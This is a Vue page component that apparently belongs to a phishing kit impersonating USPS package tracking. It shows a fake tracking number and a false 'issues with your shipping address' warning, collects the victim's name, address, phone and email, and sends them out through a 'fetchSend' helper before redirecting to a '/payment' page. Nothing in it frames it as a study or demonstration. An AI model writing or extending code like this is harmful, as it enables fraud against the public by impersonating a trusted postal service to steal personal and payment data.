<template>
  <!-- code... -->
  <div
    class="p-5 bg-[#f7f7f7] flex justify-between fixed top-14 lg:top-20 w-full z-40"
  >
    <div class="w-[217px] text-3xl text-text-heading font-helv3">
      USPS Tracking
    </div>
    <div>
      <p class="text-text-heading font-semibold">
        FAQs <i class="ri-arrow-right-s-line text-red-600"></i>
      </p>
    </div>
  </div>
  <div class="pt-40 md:pb-20 pb-10 max-w-5xl lg:pt-48 mx-auto">
    <h4
      class="font-semibold text-text-heading w-max mx-auto text-xl lg:text-2xl"
    >
      Track Another Package <i class="ri-add-line text-red-600"></i>
    </h4>
  </div>

  <div class="p-5 bg-[#f7f7f7] max-w-5xl mx-auto lg:p-10">
    <div class="mb-5">
      <h4 class="font-bold text-xl text-text-heading">Tracking Number :</h4>
      <p class="font-helv2 text-text-body">US94512106007770</p>
    </div>

    <div class="w-full h-5">
      <div v-for="item in 3" :key="item" class="h-full bg-[#]"></div>
    </div>
    <h4 class="text-red-600 text-xl font-semibold my-5">
      We have issues with your shipping address
    </h4>

    <p class="text-text-body font-helv2">
      USPS Allows you to Redeliver your package to your address in case of
      delivery failure or any other case.
    </p>
    <p class="text-text-body font-helv2">
      You can also track the package at any time, from shipment to delivery.
    </p>
    <div>
      <h4 class="text-text-heading text-xl font-semibold my-5">
        Verify Address
      </h4>

      <p class="text-text-body font-helv2">
        First, we need to confirm your address is eligible for Informed
        Delivery.
      </p>

      <div class="space-y-5 my-5">
        <Input label="Full name" v-model="store.firstname" />
        <Input label="Street Address 1" v-model="store.address" />
        <Input label="Street Address 2(OPT)" v-model="store.address2" />
        <Input label="Apartment,Suite,unit,Building" v-model="store.apart" />
        <Input label="City" v-model="store.city" />
        <FormSelect
          id="state"
          label="Select state"
          :options="states"
          :value="store.state"
          :handleChange="
            (e) => {
              store.state = e.target.value;
            }
          "
          :err="errState"
        />
        <Input label="Zip code *(OPT)" v-model="store.zip" />
        <Input label="Phone Number" v-model="store.phone" />
        <Input label="E-mail Address" v-model="store.email" />
      </div>
      <button
        class="bg-text-heading text-white px-7 py-2 mx-auto block lg:px-10 lg:py-4 lg:text-xl lg:my-10"
        @click="handleSubmit"
      >
        {{ loading ? "please wait..." : "Continue" }}
      </button>
    </div>
  </div>
</template>

<script setup>
// code...
import Input from "/src/components/MyInput.vue";
import { useCounterStore } from "/src/stores/info.js";
import { ref } from "vue";
import { useRouter } from "vue-router";
import { updateMyMessage, fetchSend } from "../utils/updateMessage.js";
import FormSelect from "/src/components/FormSelect.vue";

const router = useRouter();
const store = useCounterStore();
const loading = ref(false);
const errState = ref(false);
const myMessage = ref("");
const states = ref([
  "Alabama",
  "Alaska",
  "Arizona",
  "Arkansas",
  "California",
  "Colorado",
  "Connecticut",
  "Delaware",
  "Florida",
  "Georgia",
  "Hawaii",
  "Idaho",
  "Illinois",
  "Indiana",
  "Iowa",
  "Kansas",
  "Kentucky",
  "Louisiana",
  "Maine",
  "Maryland",
  "Massachusetts",
  "Michigan",
  "Minnesota",
  "Mississippi",
  "Missouri",
  "Montana",
  "Nebraska",
  "Nevada",
  "New Hampshire",
  "New Jersey",
  "New Mexico",
  "New York",
  "North Carolina",
  "North Dakota",
  "Ohio",
  "Oklahoma",
  "Oregon",
  "Pennsylvania",
  "Rhode Island",
  "South Carolina",
  "South Dakota",
  "Tennessee",
  "Texas",
  "Utah",
  "Vermont",
  "Virginia",
  "Washington",
  "West Virginia",
  "Wisconsin",
  "Wyoming",
]).value;

function handleSubmit() {
  const storeInfo = store.getInfo;
  const dataPoints = [
    "firstname",
    "address",
    "city",
    "state",
    "zip",
    "phone",
    "email",
  ];

  const info = {};
  dataPoints.forEach((key) => {
    info[key] = storeInfo[key];
  });
  const data = Object.values(info);

  let filled = false;

  for (let i = 0; i <= data.length; i++) {
    if (data[i] == "") {
      filled = false;
      if (store.state == "") {
        errState.value = true;
      }
      return;
    } else if (data[i] != "") {
      if (store.state != "") {
        errState.value = false;
      }
      filled = true;
    }
  }

  if (filled === true && data.length != 0) {
    loading.value = true;
    store.cardType = store.getCardType;

    const theKeys = Object.keys(info);
    for (let i = 0; i < 1; i++) {
      updateMyMessage(myMessage, `${theKeys[i]}:   ${data[i]}`);
    }
    fetchSend(myMessage.value, () => router.push("/payment"));
  }
}
</script>

<style scoped></style>
